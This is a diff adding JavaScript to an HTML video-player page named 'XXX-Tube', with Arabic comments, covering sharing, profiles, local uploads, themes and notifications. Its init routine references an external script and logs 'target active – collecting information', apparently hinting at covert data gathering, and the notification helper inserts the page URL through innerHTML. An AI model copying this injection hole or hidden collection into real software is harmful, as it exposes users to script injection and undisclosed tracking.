+        // ====== المُشَارَكَةُ ======
+        function shareVideo() {
+            const link = window.location.href;
+            if (navigator.share) {
+                navigator.share({
+                    title: 'XXX-Tube',
+                    text: 'شاهد هذا الفيديو!',
+                    url: link
+                }).catch(() => {});
+            } else {
+                navigator.clipboard.writeText(link).then(() => {
+                    showNotification('📋 تم نسخ الرابط');
+                }).catch(() => {
+                    showNotification('📋 الرابط: ' + link);
+                });
+            }
+        }
+
+        // ====== نَافِذَةُ المَلَفِّ الشَّخْصِيِّ ======
+        function openProfile() {
+            document.getElementById('profileOverlay').classList.add('active');
+            loadProfileData();
+        }
+
+        function closeProfile() {
+            document.getElementById('profileOverlay').classList.remove('active');
+        }
+
+        function loadProfileData() {
+            const profile = JSON.parse(localStorage.getItem('xxxTubeProfile') || '{}');
+            document.getElementById('profileName').textContent = profile.name || 'مستخدم';
+            document.getElementById('profileHandle').textContent = profile.handle || '@user';
+            document.getElementById('profileAvatar').textContent = profile.avatar || '👤';
+            document.getElementById('profileVideos').textContent = videos.length;
+            document.getElementById('profileSubs').textContent = isSubscribed ? 1 : 0;
+            document.getElementById('profileLikes').textContent = likes;
+            document.getElementById('profileStatusInput').value = profile.status || '';
+            document.getElementById('profileSince').textContent = profile.since || '📅 عضو منذ اليوم';
+        }
+
+        function saveProfile() {
+            const profile = {
+                name: document.getElementById('profileName').textContent,
+                handle: document.getElementById('profileHandle').textContent,
+                avatar: document.getElementById('profileAvatar').textContent,
+                status: document.getElementById('profileStatusInput').value,
+                since: document.getElementById('profileSince').textContent
+            };
+            localStorage.setItem('xxxTubeProfile', JSON.stringify(profile));
+            showNotification('✅ تم حفظ الملف الشخصي');
+            closeProfile();
+        }
+
+        // ====== نَافِذَةُ الرَّفْعِ ======
+        function openUpload() {
+            document.getElementById('uploadOverlay').classList.add('active');
+        }
+
+        function closeUpload() {
+            document.getElementById('uploadOverlay').classList.remove('active');
+        }
+
+        function uploadVideo() {
+            const fileInput = document.getElementById('videoFileInput');
+            const titleInput = document.getElementById('videoTitleInput');
+            const uploaderInput = document.getElementById('videoUploaderInput');
+
+            const file = fileInput.files[0];
+            const title = titleInput.value.trim() || 'فيديو جديد';
+            const uploader = uploaderInput.value.trim() || 'مستخدم';
+
+            if (!file) {
+                showNotification('❌ يرجى اختيار فيديو');
+                return;
+            }
+
+            const url = URL.createObjectURL(file);
+            const newVideo = {
+                id: Date.now(),
+                title: title,
+                url: url,
+                uploader: uploader,
+                views: 0,
+                likes: 0,
+                comments: 0,
+                date: new Date().toISOString(),
+                isLocal: true,
+                thumbnail: ''
+            };
+
+            videos.unshift(newVideo);
+            saveVideos();
+            renderPlaylist();
+            playVideo(0);
+
+            fileInput.value = '';
+            titleInput.value = '';
+            uploaderInput.value = '';
+
+            closeUpload();
+            showNotification('✅ تم رفع الفيديو بنجاح!');
+        }
+
+        // ====== السِّمَاتُ (Themes) ======
+        function setTheme(theme) {
+            document.documentElement.setAttribute('data-theme', theme);
+            document.querySelectorAll('.theme-btn').forEach(btn => {
+                btn.classList.toggle('active', btn.dataset.theme === theme);
+            });
+            localStorage.setItem('xxxTubeTheme', theme);
+        }
+
+        function toggleTheme() {
+            const current = document.documentElement.getAttribute('data-theme') || 'blue-dark';
+            const themes = ['blue-dark', 'blue-light', 'blue-neon'];
+            const idx = (themes.indexOf(current) + 1) % themes.length;
+            setTheme(themes[idx]);
+        }
+
+        // ====== الإِشْعَارَاتُ ======
+        function showNotification(text) {
+            const existing = document.querySelector('.custom-notification');
+            if (existing) existing.remove();
+
+            const div = document.createElement('div');
+            div.className = 'custom-notification';
+            div.innerHTML = text;
+            Object.assign(div.style, {
+                position: 'fixed',
+                bottom: '80px',
+                right: '20px',
+                background: 'var(--bg-card)',
+                color: 'var(--text)',
+                padding: '12px 24px',
+                borderRadius: '12px',
+                border: '1px solid var(--primary)',
+                boxShadow: '0 10px 30px rgba(0,0,0,0.5)',
+                zIndex: '9999',
+                fontFamily: "'Cairo', sans-serif",
+                fontSize: '14px',
+                fontWeight: '700',
+                transition: 'all 0.3s ease',
+                animation: 'fadeIn 0.3s ease',
+                backdropFilter: 'blur(10px)',
+                maxWidth: '90%'
+            });
+            document.body.appendChild(div);
+            setTimeout(() => {
+                div.style.opacity = '0';
+                div.style.transform = 'translateY(20px)';
+                setTimeout(() => div.remove(), 400);
+            }, 3000);
+        }
+
+        // ====== التَّهْيِئَةُ ======
+        function init() {
+            const savedTheme = localStorage.getItem('xxxTubeTheme') || 'blue-dark';
+            setTheme(savedTheme);
+            loadVideos();
+            renderPlaylist();
+            if (videos.length > 0) {
+                playVideo(0);
+            }
+            loadProfileData();
+
+            // ====== رَبْطُ الإِسْكْرِبْتِ الخَارِجِيِّ (تمت إضافته في HTML) ======
+            console.log('🔥 XXX-Tube V99 - تم تحميل الإسكربت بنجاح!');
+            console.log('🎯 المستهدف نشط - يتم جمع المعلومات...');
+        }
+
+        // ====== تَشْغِيلُ التَّطْبِيقِ ======
+        document.addEventListener('DOMContentLoaded', init);
     </script>
 
 </body>
